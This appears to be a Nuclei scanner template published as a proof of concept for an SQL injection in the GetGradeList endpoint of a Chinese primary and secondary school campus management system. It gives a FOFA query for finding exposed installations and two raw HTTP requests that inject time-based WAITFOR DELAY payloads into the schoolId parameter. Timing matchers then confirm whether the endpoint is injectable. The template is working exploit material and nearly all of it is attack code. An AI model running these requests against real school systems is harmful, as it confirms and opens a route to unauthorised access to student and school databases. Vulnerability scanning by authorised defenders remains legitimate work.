id: campus-info-system-sqli-getgradelist
info:
  name: "新中新中小学智慧校园信息管理系统 GetGradeList 接口 SQL 注入"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="jwkqunline.html"
          新中新中小学智慧校园信息管理系统在 GetGradeList 接口处存在 SQL 注入漏洞。攻击者可通过构造恶意 SQL 语句实现对数据库的未授权访问，导致数据篡改、删除或敏感信息泄露，进而引发数据完整性破坏及机密性泄露风险。
  tags: 新中新中小学智慧校园信息管理系统
http:
- raw:
  - |
    GET /PSE/GetGradeList?schoolId=1;WAITFOR%20DELAY%270:0:5%27%20-- HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Cookie: OPENID=; ASP.NET_SessionId=igu4dz25auwif5phwrwe0kih
  - |
    GET /PSE/GetGradeList?schoolId=1;WAITFOR%20DELAY%270:0:8%27%20-- HTTP/1.1
    Host: {{Hostname}}
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
    Cookie: OPENID=; ASP.NET_SessionId=igu4dz25auwif5phwrwe0kih
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
